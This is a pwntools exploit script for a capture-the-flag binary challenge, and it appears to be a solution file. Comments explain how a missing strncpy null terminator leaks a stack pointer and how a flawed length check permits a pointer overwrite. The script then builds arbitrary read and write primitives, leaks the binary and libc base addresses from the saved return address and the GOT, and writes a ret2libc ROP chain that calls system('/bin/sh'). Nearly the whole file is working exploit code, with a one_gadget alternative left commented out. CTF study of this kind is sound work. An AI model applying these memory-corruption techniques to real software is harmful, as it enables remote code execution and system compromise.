#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")
libc = ELF("./libc.so.6")

context.binary = exe.path
context.terminal = ["tmux", "new-window"]


def conn():
    if args.REMOTE:
        r = remote("localhost", 1337)
    else:
        r = process([exe.path])

    return r

def attach_gdb():
    if args.GDB:
        gdb.attach(r, gdbscript="""
source ~/opt/pwndbg/gdbinit.py
b*get_input
c
        """)

def arb_read(addr):
    # this check is wrong :
    #   if (input_len <= sizeof(user->username)
    #       || input_len <= strlen(user->username)) {

    # as strncpy does not always put a null byte strlen(user->username) is
    # greater than sizeof(user->username), so there is a buffer overflow on the
    # pointer user->personnal_info
    # we can overwrite it with any pointer, and read it with "print info" to
    # get an arbitrary read primitive

    r.sendlineafter(b"> ", b"change username")
    r.sendlineafter(b"new username: ", b"B"*16 + p64(addr))

    r.sendlineafter(b"> ", b"print info")
    r.recvuntil(b"information: ")
    return r.recvuntil(b"\nAVAILABLE", drop=True)

def arb_write(addr, data):
    arb_read(addr)
    r.sendlineafter(b"> ", b"set info")
    r.sendlineafter(b"information: ", data)

def main():
    global r
    r = conn()
    attach_gdb()

    # strncpy(dst, src, n) does not put a null byte at the end of the string
    # if strlen(src) >= 16 so we can leak what is placed just after the
    # username, this is a pointer pointing on the stack
    r.sendlineafter(b"> ", b"set username")
    r.sendlineafter(b"new username: ", b"A"*16)
    r.recvuntil(b"hi ")
    stack_leak = r.recvuntil(b"!\nAVAILABLE", drop=True)[16:]
    stack_leak = u64(stack_leak.ljust(8, b"\x00"))
    print(f"stack_leak : {hex(stack_leak)}")

    # we can calculate the address of saved rip
    addr_ret_address = stack_leak - 0x18

    r.sendlineafter(b"> ", b"set info")
    r.sendlineafter(b"information: ", b"toto")

    # leak saved rip to leak the binary base address
    leak = u64(arb_read(addr_ret_address).ljust(8, b"\x00"))
    exe.address = leak - exe.sym["main"] - 49
    print(f"exe @ {hex(exe.address)}")

    # read the Global Offset Table to leak the libc base address
    leak = u64(arb_read(exe.got["puts"]).ljust(8, b"\x00"))
    libc.address = leak - libc.sym["puts"]
    print(f"libc @ {hex(libc.address)}")

    # now that we have the libc base address, we can do a ret2libc
    bin_sh = p64(next(libc.search(b"/bin/sh\x00")))
    rop = p64(libc.address + 0x000000000002a3e5) # pop rdi ; ret
    rop += bin_sh
    # beware of the movaps issue
    # add a simple ret to align the stack on a multiple of 0x10
    rop += p64(exe.address + 0x000000000000101a) # ret
    rop += p64(libc.sym["system"])


    # instead of doing a classic ret2libc, we can also use one_gadgets
    # these gadgets are useful when we can only call a single function without
    # controlling the arguments

    # get these gadgets using the one_gadget utility, by running
    # $ one_gadget libc.so.6
    one_gadgets = [0x50a37, 0xebcf1, 0xebcf5, 0xebcf8]
    one_gadget = one_gadgets[3]

    # the choosen gadget has some constraints :
    # address rbp-0x78 is writable
    # [rsi] == NULL || rsi == NULL
    # [rdx] == NULL || rdx == NULL

    # rop = p64(libc.address + 0x000000000002be51) # pop rsi ; ret
    # rop += p64(0) # rsi
    # rop += p64(libc.address + 0x000000000011f497) # pop rdx ; pop r12 ; ret
    # rop += p64(0) # rdx
    # rop += p64(0) # r12
    # rop += p64(libc.address + one_gadget)


    arb_write(addr_ret_address, rop)

    r.sendlineafter(b"> ", b"exit")


    r.interactive()

if __name__ == "__main__":
    main()
